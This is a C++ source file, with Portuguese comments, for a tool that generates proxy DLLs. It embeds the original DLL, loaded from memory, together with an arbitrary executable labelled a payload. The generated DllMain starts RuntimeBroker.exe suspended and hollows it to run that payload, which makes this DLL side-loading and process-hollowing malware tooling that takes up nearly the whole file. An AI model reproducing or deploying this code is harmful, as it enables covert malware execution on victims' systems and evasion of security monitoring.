#include <iostream>
#include <Windows.h>
#include <Commdlg.h>
#include <String.h>
#include <winnt.h>
#include <imagehlp.h>
#include <vector>
#include <string>
#include <fstream>
#include <tchar.h>
#include <stdio.h>
#include <iomanip>
#include <iostream>

using namespace std;

struct RawFile {
    LPVOID data;
    DWORD size;
};

RawFile GetFileContent(const char* lpFilePath)
{
	RawFile result = { nullptr, 0 };
	// Abre o arquivo
    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Erro ao abrir o arquivo PE!\n");
        return result;
    }
    // Pega o tamanho real
    DWORD dFileSize = GetFileSize(hFile, nullptr);
    if (dFileSize == INVALID_FILE_SIZE)
    {
        printf("[-] Erro ao ler tamanho do arquivo!\n");
        CloseHandle(hFile);
        return result;
    }
    // Aloca a memória exata necessária
    LPVOID hFileContent = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dFileSize);
    if (hFileContent == nullptr)
    {
        printf("[-] Erro de alocacao de memoria!\n");
        CloseHandle(hFile);
        return result;
    }
    // Lê o arquivo para a memória
    DWORD bytesRead = 0;
    BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, &bytesRead, nullptr);
    if (!bFileRead || bytesRead != dFileSize)
    {
        printf("[-] Erro ao ler o conteudo do arquivo!\n");
        HeapFree(GetProcessHeap(), 0, hFileContent); // Limpa se falhar
        CloseHandle(hFile);
        return result;
    }
    CloseHandle(hFile);
	result.data = hFileContent;
    result.size = dFileSize;
    return result;
}

// Check if its 32bit or 64bit
WORD fileType;
vector<string> names;

const vector<string> explode(const string &s, const char &c)
{
    string buff{""};
    vector<string> v;
    for (auto n : s)
    {
        if (n != c)
            buff += n;
        else if (n == c && buff != "")
        {
            v.push_back(buff);
            buff = "";
        }
    }
    if (buff != "")
        v.push_back(buff);
    return v;
}

// Função auxiliar para ler o arquivo binário para um vetor
bool getFileContent(const string &path, vector<unsigned char> &buffer) {
    ifstream file(path, ios::binary | ios::ate);
    if (!file.is_open()) return false;
    streamsize size = file.tellg();
    file.seekg(0, ios::beg);
    buffer.resize(size);
    if (file.read((char*)buffer.data(), size))
        return true;
    return false;
}

bool getImageFileHeaders(string fileName, IMAGE_NT_HEADERS &headers)
{
    std::wstring wFileName = std::wstring(fileName.begin(), fileName.end());
    HANDLE fileHandle = CreateFileW(
        wFileName.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0);
    if (fileHandle == INVALID_HANDLE_VALUE)
        return false;

    HANDLE imageHandle = CreateFileMappingW(
        fileHandle,
        nullptr,
        PAGE_READONLY,
        0,
        0,
        nullptr);
    if (imageHandle == 0)
    {
        CloseHandle(fileHandle);
        return false;
    }
    void *imagePtr = MapViewOfFile(
        imageHandle,
        FILE_MAP_READ,
        0,
        0,
        0);
    if (imagePtr == nullptr)
    {
        CloseHandle(imageHandle);
        CloseHandle(fileHandle);
        return false;
    }
    PIMAGE_NT_HEADERS headersPtr = ImageNtHeader(imagePtr);
    if (headersPtr == nullptr)
    {
        UnmapViewOfFile(imagePtr);
        CloseHandle(imageHandle);
        CloseHandle(fileHandle);
        return false;
    }
    headers = *headersPtr;
    UnmapViewOfFile(imagePtr);
    CloseHandle(imageHandle);
    CloseHandle(fileHandle);
    return true;
}

void listDLLFunctions(string sADllName, vector<string> &slListOfDllFunctions)
{
    DWORD *dNameRVAs(0);
    _IMAGE_EXPORT_DIRECTORY *ImageExportDirectory;
    unsigned long cDirSize;
    _LOADED_IMAGE LoadedImage;
    string sName;
    slListOfDllFunctions.clear();
    if (MapAndLoad(sADllName.c_str(), NULL, &LoadedImage, TRUE, TRUE))
    {
        ImageExportDirectory = (_IMAGE_EXPORT_DIRECTORY *)ImageDirectoryEntryToData(LoadedImage.MappedAddress, false, IMAGE_DIRECTORY_ENTRY_EXPORT, &cDirSize);

        if (ImageExportDirectory != NULL)
        {
            dNameRVAs = (DWORD *)ImageRvaToVa(LoadedImage.FileHeader, LoadedImage.MappedAddress, ImageExportDirectory->AddressOfNames, NULL);

            for (size_t i = 0; i < ImageExportDirectory->NumberOfNames; i++)
            {
                sName = (char *)ImageRvaToVa(LoadedImage.FileHeader, LoadedImage.MappedAddress, dNameRVAs[i], NULL);
                slListOfDllFunctions.push_back(sName);
            }
        }
        UnMapAndLoad(&LoadedImage);
    }
}

void generateDEF(string name, vector<string> names)
{
    std::fstream file;
    file.open(name + ".def", std::ios::out);
    file << "LIBRARY " << name << endl;
    file << "EXPORTS" << endl;

    for (int i = 0; i < names.size(); i++)
    {
        file << "\t" << names[i] << "=Fake" << names[i] << " @" << i + 1 << endl;
    }

    file.close();
}

void generateMainCPP(string name, vector<string> names, string originalDllPath, RawFile exe)
{
    // Ler o binário da DLL original
    vector<unsigned char> dllData;
    if (!getFileContent(originalDllPath, dllData)) {
        cout << "[-] Erro ao ler o binario da DLL original para embutir." << endl;
        return;
    }
    cout << "[+] DLL original lida: " << dllData.size() << " bytes." << endl;
    std::fstream file;
    file.open(name + ".cpp", std::ios::out);
    // Inclusão do MemoryModule. 
    // O usuário precisará ter MemoryModule.h e MemoryModule.c no projeto da DLL gerada.
    file << "#include <windows.h>" << endl
         << "#include <stdio.h>" << endl
         << "#include <string>" << endl
         << "#include <iostream>" << endl
         << "#include <vector>" << endl
         << "#include \"MemoryModule.h\"" << endl
         << "#include \"process_hollowing.h\"" << endl
         << endl;
    // Escreve o array de bytes (Hex Dump)
    file << "// Binario da DLL Original embutido" << endl;
    file << "unsigned char originalDllData[" << dllData.size() << "] = {" << endl;
    file << hex << setfill('0'); 
    for (size_t i = 0; i < dllData.size(); ++i) {
        file << "0x" << setw(2) << (int)dllData[i];
        if (i != dllData.size() - 1) file << ",";
        if ((i + 1) % 16 == 0) file << endl;
    }
    file << dec; // Volta para decimal
    file << "};" << endl << endl;
    file << "struct " << name << "_dll { \n"
         << "\tHMEMORYMODULE dll;\n"; // Mudança de HMODULE para HMEMORYMODULE
    for (int i = 0; i < names.size(); i++)
    {
        file << "\tFARPROC Orignal" << names[i] << ";\n";
    }
    file << "} " << name << ";\n\n";
    // Generate Exports
    if (fileType == IMAGE_FILE_MACHINE_AMD64) // 64bit
    {
        file << "extern \"C\"" << endl
             << "{" << endl;
        for (int i = 0; i < names.size(); i++)
        {
            file << "\t__attribute__((naked)) void Fake" << names[i] << "() { asm volatile (\"jmp *%0\" : : \"m\" (" << name << ".Orignal" << names[i] << ")); }\n";
        }
        file << "}" << endl;
    }
    else
    { //x86
        for (int i = 0; i < names.size(); i++)
        {
            file << "__declspec(naked) void Fake" << names[i] << "() { _asm { jmp[" << name << ".Orignal" << names[i] << "] } }\n";
        }
    }
    file << "\n";
    if (exe.data != nullptr) {
        cout << "Exe lido com sucesso! Tamanho: " << exe.size << " bytes.\n";
        unsigned char* pBuffer = (unsigned char*) exe.data;
        cout << "[*] Escrevendo " << exe.size << " bytes ...\n";
        file << "size_t payloadSize = " << exe.size << ";";
        file << "unsigned char rawData[" << exe.size << "] = {\n";
        for (DWORD i = 0; i < exe.size; i++) {
            file << "0x" << std::uppercase << std::hex << std::setw(2) << std::setfill('0') << (int)pBuffer[i];
            if (i < exe.size - 1) {
                file << ",";
            }
            if ((i + 1) % 16 == 0) {
                file << "\n    ";
            }
        }
        file << "};\n";
        HeapFree(GetProcessHeap(), 0, exe.data);
    } else {
        printf("Falha ao ler o arquivo.\n");
    }
    file << "\n";
    //incluir GetRuntimeBrokerPath
    file << "std::vector<unsigned char> GetRuntimeBrokerPath() {\n";
    file << "\twchar_t buffer[MAX_PATH];\n";
    file << "\tUINT result = GetSystemDirectoryW(buffer, MAX_PATH);\n";
    file << "\tif (result == 0 || result > MAX_PATH) {\n";
    file << "\t\treturn {};\n";
    file << "\t}\n";
    file << "\tstd::wstring wPath = std::wstring(buffer) + L\"\\\\RuntimeBroker.exe\";\n";
    file << "\tint size_needed = WideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), NULL, 0, NULL, NULL);\n";
    file << "\tstd::vector<unsigned char> utf8_buffer(size_needed);\n";
    file << "\tWideCharToMultiByte(CP_UTF8, 0, wPath.c_str(), (int)wPath.size(), reinterpret_cast<char*>(utf8_buffer.data()), size_needed, NULL, NULL);\n";
    file << "\treturn utf8_buffer;\n";
    file << "}\n";
    file << "\n";
    // DllMain Modificado para carregar da memória
    file << "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {" << endl;
    file << "\tswitch (ul_reason_for_call)" << std::endl;
    file << "\t{" << std::endl;
    file << "\tcase DLL_PROCESS_ATTACH:" << std::endl;
    file << "\t{" << std::endl;
    //Carregamento do exe na memoria

    file << "\t\tif (rawData == nullptr || payloadSize == 0) {\n";
    file << "\t\t\tMessageBox(0, \"Erro: Nenhum payload carregado na memoria global\", \"Proxy Error\", MB_ICONERROR);\n";
    file << "\t\t\treturn -1;\n";
    file << "\t\t}\n";
    file << "\t\tLPVOID hFileContent = (LPVOID) rawData; \n";
    file << "\t\tif (!IsValidPE(hFileContent)) {\n";
    file << "\t\t\tMessageBox(0, \"Payload invalido (Nao e um PE valido)\", \"Proxy Error\", MB_ICONERROR);\n";
    file << "\t\t\treturn -1;\n";
    file << "\t\t}\n";
    file << "\t\tBOOL bPayloadIs32Bit = IsPE32(hFileContent);\n";
    file << "\t\tchar lpTargetProcess[MAX_PATH];\n";
    file << "\t\tif (bPayloadIs32Bit) {\n";
    file << "\t\t\tstrcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));\n";
    file << "\t\t} else {\n";
    file << "\t\t\tstrcpy_s(lpTargetProcess, reinterpret_cast<const char*>(GetRuntimeBrokerPath().data()));\n";
    file << "\t\t}\n";
    file << "\t\tSTARTUPINFOA PI_StartupInfo;\n";
    file << "\t\tPROCESS_INFORMATION PI_ProcessInfo;\n";
    file << "\t\tmemset(&PI_StartupInfo, 0, sizeof(PI_StartupInfo));\n";
    file << "\t\tmemset(&PI_ProcessInfo, 0, sizeof(PI_ProcessInfo));\n";
    file << "\t\tPI_StartupInfo.cb = sizeof(PI_StartupInfo);\n";
    file << "\t\tif (!CreateProcessA(NULL, lpTargetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &PI_StartupInfo, &PI_ProcessInfo)) {\n";
    file << "\t\t\tMessageBox(0, \"Erro ao criar processo alvo\", \"Proxy Error\", MB_ICONERROR);\n";
    file << "\t\t\treturn -1;\n";
    file << "\t\t}\n";
    file << "\t\tBOOL success = FALSE;\n";
    file << "\t\tif (bPayloadIs32Bit) {\n";
    file << "\t\t\tif (HasRelocation32(hFileContent)) {\n";
    file << "\t\t\t\tsuccess = RunPEReloc32(&PI_ProcessInfo, hFileContent);\n";
    file << "\t\t\t} else {\n";
    file << "\t\t\t\tsuccess = RunPE32(&PI_ProcessInfo, hFileContent);\n";
    file << "\t\t\t}\n";
    file << "\t\t} else {\n";
    file << "\t\t\tif (HasRelocation64(hFileContent)) {\n";
    file << "\t\t\t\tsuccess = RunPEReloc64(&PI_ProcessInfo, hFileContent);\n";
    file << "\t\t\t} else {\n";
    file << "\t\t\t\tsuccess = RunPE64(&PI_ProcessInfo, hFileContent);\n";
    file << "\t\t\t}\n";
    file << "\t\t}\n";
    file << "\t\tif (success) {\n";
    file << "\t\t\tResumeThread(PI_ProcessInfo.hThread);\n";
    file << "\t\t} else {\n";
    file << "\t\t\tTerminateProcess(PI_ProcessInfo.hProcess, 0);\n";
    file << "\t\t}\n";

    // Carregamento via MemoryModule
    file << "\t\t" << name << ".dll = MemoryLoadLibrary(originalDllData, sizeof(originalDllData));" << std::endl;
    file << "\t\tif (" << name << ".dll == NULL)" << std::endl;
    file << "\t\t{" << std::endl;
    file << "\t\t\tMessageBox(0, \"Cannot load embedded library from memory\", \"Proxy Error\", MB_ICONERROR);" << std::endl;
    file << "\t\t\tExitProcess(0);" << std::endl;
    file << "\t\t}" << std::endl;
    for (int i = 0; i < names.size(); i++)
    {
        // GetProcAddress vira MemoryGetProcAddress
        file << "\t\t" << name << ".Orignal" << names[i] << " = MemoryGetProcAddress(" << name << ".dll, \"" << names[i] << "\");" << std::endl;
    }
    file << "" << std::endl;
    file << "\t\tbreak;" << std::endl;
    file << "\t}" << std::endl;
    file << "\tcase DLL_PROCESS_DETACH:" << std::endl;
    file << "\t{" << std::endl;
    file << "\t\tif (" << name << ".dll) MemoryFreeLibrary(" << name << ".dll);" << std::endl;
    file << "\t}" << std::endl;
    file << "\tbreak;" << std::endl;
    file << "\t}" << std::endl;
    file << "\treturn TRUE;" << std::endl;
    file << "}" << std::endl;
    file.close();
}

void generateASM(string name)
{
    std::fstream file;
    file.open(name + ".asm", std::ios::out);
    file << ".data" << endl;
    file << "extern PA : qword" << endl;
    file << ".code" << endl;
    file << "RunASM proc" << endl;
    file << "jmp qword ptr [PA]" << endl;
    file << "RunASM endp" << endl;
    file << "end" << endl;
    file.close();
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        cout << "Usage: generator.exe <path_to_dll>" << endl;
        return 1;
    }
    std::vector<std::string> args(argv, argv + argc);
    IMAGE_NT_HEADERS headers;
    if (getImageFileHeaders(args[1], headers))
    {
        fileType = headers.FileHeader.Machine;
    }
    else {
        cout << "Error reading PE headers." << endl;
        return 1;
    }
    // Get filename
    vector<std::string> fileNameV = explode(args[1], '\\');
    std::string fileName = fileNameV[fileNameV.size() - 1];
    fileName = fileName.substr(0, fileName.size() - 4);
    // Get dll export names
    listDLLFunctions(args[1], names);
    // Create Def File e CPP com binário embutido
    generateDEF(fileName, names);
    RawFile exe = GetFileContent(args[2].c_str());
    generateMainCPP(fileName, names, args[1], exe); // Passamos o caminho completo agora
    if (fileType == IMAGE_FILE_MACHINE_AMD64) {
        generateASM(fileName);
    }
    cout << "[+] Codigo gerado com sucesso!" << endl;
    return 0;
}